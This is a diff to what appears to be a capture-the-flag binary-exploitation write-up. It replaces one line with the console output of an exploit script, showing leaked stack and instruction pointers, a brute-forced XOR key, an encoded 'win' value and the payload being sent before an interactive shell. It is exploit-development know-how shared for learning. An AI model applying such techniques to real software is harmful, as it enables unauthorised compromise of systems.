@@ -366,7 +366,19 @@ The last thing I had to do is to xor my entire payload with 0x77 since my payloa
 And....
 
 ```
-win_enc value : 0xf332e578071f06e4
+$ python3 exploit.py
+leak1  - 0x0000000000000000
+rbp    - 0x86702625b2e54d13
+null1  - 0x0000564d5ae60110
+leak2  - 0x0000000000000000
+null2  - 0x0000000000000000
+leak3  - 0x0000000000000000
+rsp    - 0x86702625b0a54d13
+rip    - 0xd51563324a3b4d13
+Brute forcing 3 LSB xor key
+
+Found match for xor key = 0x602
+win_enc value : 0xa689ea8ab1992397
 Sending payload...
 ---------------------------
 [*] Switching to interactive mode
